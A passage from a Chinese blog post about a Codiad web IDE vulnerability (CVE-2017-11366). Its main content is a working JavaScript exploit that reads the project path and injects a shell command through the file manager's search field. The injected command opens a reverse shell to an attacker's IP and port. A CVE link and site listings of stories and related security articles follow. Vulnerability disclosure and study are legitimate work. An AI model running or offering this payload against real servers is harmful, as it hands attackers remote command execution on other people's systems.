$.get("/components/project/controller.php?action=get_current",function(d){p=JSON.parse(d)['data']['path'];$.post("/components/filemanager/controller.php?action=search&path="+p,{"search_file_type":"\"\n/bin/bash -c 'sh -i >&/dev/tcp/"+ip+"/"+port+" 0>&1'\ngrep \"",});});

```

---

参考资料 :

> [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11366](https://link.jianshu.com?t=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11366)

最后编辑于 ：2017.12.09 00:57:42©著作权归作者所有,转载或内容合作请联系作者

* [人面猴](/p/1003a129be45)序言：七十年代末，一起剥皮案震惊了整个滨河市，随后出现的几起案子，更是在滨河造成了极大的恐慌，老刑警刘岩，带你破解...[沈念sama](/u/dcd395522934)阅读 215,723评论 6赞 498
* [死咒](/p/1c4506f51019)序言：滨河连续发生了三起死亡事件，死亡现场离奇诡异，居然都是意外死亡，警方通过查阅死者的电脑和手机，发现死者居然都...[沈念sama](/u/dcd395522934)阅读 92,003评论 3赞 391
* [救了他两次的神仙让他今天三更去死](/p/1ded57e57939)文/潘晓璐 我一进店门，熙熙楼的掌柜王于贵愁眉苦脸地迎上来，“玉大人，你说我怎么就摊上这事。” “怎么了？”我有些...[开封第一讲书人](/u/5891e866c93e)阅读 161,512评论 0赞 351
* [道士缉凶录：失踪的卖姜人](/p/25685c1b1f2b) 文/不坏的土叔 我叫张陵，是天一观的道长。 经常有香客问我，道长，这世上最难降的妖魔是什么？ 我笑而不...[开封第一讲书人](/u/5891e866c93e)阅读 57,825评论 1赞 290
* [﻿港岛之恋（遗憾婚礼）](/p/553802eff5d6)正文 为了忘掉前任，我火速办了婚礼，结果婚礼上，老公的妹妹穿的比我还像新娘。我一直安慰自己，他们只是感情好，可当我...[茶点故事](/u/0f438ff0a55f)阅读 66,874评论 6赞 388
* [恶毒庶女顶嫁案：这布局不是一般人想出来的](/p/59985a89b4ef)文/花漫 我一把揭开白布。 她就那样静静地躺着，像睡着了一般。 火红的嫁衣衬着肌肤如雪。 梳的纹丝不乱的头发上，一...[开封第一讲书人](/u/5891e866c93e)阅读 50,841评论 1赞 295
* [城市分裂传说](/p/62a01de427e0)那天，我揣着相机与录音，去河边找鬼。 笑死，一个胖子当着我的面吹牛，可吹牛的内容都是我干的。 我是一名探鬼主播，决...[沈念sama](/u/dcd395522934)阅读 39,812评论 3赞 416
* [双鸳鸯连环套：你想象不到人心有多黑](/p/6ccdc163474a)文/苍兰香墨 我猛地睁开眼，长吁一口气：“原来是场噩梦啊……” “哼！你这毒妇竟也来了？” 一声冷哼从身侧响起，我...[开封第一讲书人](/u/5891e866c93e)阅读 38,582评论 0赞 271
* [万荣杀人案实录](/p/8796e3463067)序言：老挝万荣一对情侣失踪，失踪者是张志新（化名）和其女友刘颖，没想到半个月后，有当地人在树林里发现了一具尸体，经...[沈念sama](/u/dcd395522934)阅读 45,033评论 1赞 308
* [﻿护林员之死](/p/8a691dd8fa34)正文 独居荒郊野岭守林人离奇死亡，尸身上长有42处带血的脓包…… 初始之章·张勋 以下内容为张勋视角 年9月15日...[茶点故事](/u/0f438ff0a55f)阅读 37,309评论 2赞 331
* [﻿白月光启示录](/p/a5293fa3b5e0)正文 我和宋清朗相恋三年，在试婚纱的时候发现自己被绿了。 大学时的朋友给我发了我未婚夫和他白月光在一起吃饭的照片。...[茶点故事](/u/0f438ff0a55f)阅读 39,450评论 1赞 345
* [活死人](/p/a83aa7e71001)序言：一个原本活蹦乱跳的男人离奇死亡，死状恐怖，灵堂内的尸体忽然破棺而出，到底是诈尸还是另有隐情，我是刑警宁泽，带...[沈念sama](/u/dcd395522934)阅读 35,158评论 5赞 341
* [﻿日本核电站爆炸内幕](/p/bee7d9c3fcf9)正文 年R本政府宣布，位于F岛的核电站，受9级特大地震影响，放射性物质发生泄漏。R本人自食恶果不足惜，却给世界环境...[茶点故事](/u/0f438ff0a55f)阅读 40,789评论 3赞 325
* [男人毒药：我在死后第九天来索命](/p/c2cfc4cb0aa7)文/蒙蒙 一、第九天 我趴在偏房一处隐蔽的房顶上张望。 院中可真热闹，春花似锦、人声如沸。这庄子的主人今日做“春日...[开封第一讲书人](/u/5891e866c93e)阅读 31,409评论 0赞 21
* [一桩弑父案，背后竟有这般阴谋](/p/c329b54bd638)文/苍兰香墨 我抬头看了看天上的太阳。三九已至，却和暖如春，着一层夹袄步出监牢的瞬间，已是汗流浃背。 一阵脚步声响...[开封第一讲书人](/u/5891e866c93e)阅读 32,609评论 1赞 268
* [情欲美人皮](/p/d79d2f48417f)我被黑心中介骗来泰国打工， 没想到刚下飞机就差点儿被人妖公主榨干…… 1. 我叫王不留，地道东北人。 一个月前我还...[沈念sama](/u/dcd395522934)阅读 47,440评论 2赞 368
* [代替公主和亲](/p/fc890ed5083c)正文 我出身青楼，却偏偏与公主长得像，于是被迫代替她去往敌国和亲。 传闻我的和亲对象是个残疾皇子，可洞房花烛夜当晚...[茶点故事](/u/0f438ff0a55f)阅读 44,357评论 2赞 352
### 推荐阅读[更多精彩内容](/)

* [[CVE-2017-15689]Codiad 漏洞挖掘笔记 (0x04) [新的远程命令执行漏洞]](/p/162844f45f1d)本文首发地址 : https://xianzhi.aliyun.com/forum/read/2046.html ...[王一航](/u/bf30f18c872c)阅读 1,502评论 0赞 6
* [【漏洞公告】CVE-2017-12635/12636:Apache CouchDB 远程命令执行漏洞](/p/4dac037ba6e5)近期阿里云威胁情报监控开源数据库Apache CouchDB于2017年11月7日发布新版本2.1.1 &1.7....[暖夏未眠丶](/u/b11bdc2f1fd4)阅读 1,279评论 0赞 1
* [Android - 收藏集](/p/dad51f6c9c4d) Android 自定义View的各种姿势1 Activity的显示之ViewRootImpl详解 Activity...[passiontim](/u/e946d18f163c)阅读 172,040评论 25赞 707
* [Android WebView远程执行代码漏洞浅析](/p/175a50076cf7)原文：http://blog.csdn.net/fengling59/article/details/503795...[hejunbinlan](/u/a3bd8bfd5748)阅读 2,900评论 0赞 2
* [跑操和占课的反思](/p/0850267e2301)感恩分享 1． 与一个弱连接的朋友取得了联系，感激她的信任。人生路上有这么多奇遇，真好。 2． 见到了一个朋友，毕...[lijutong\_010](/u/edc02f9dcd82)阅读 605评论 0赞 1
评论0赞66赞7赞赞赏![](data:image/gif;base64...)
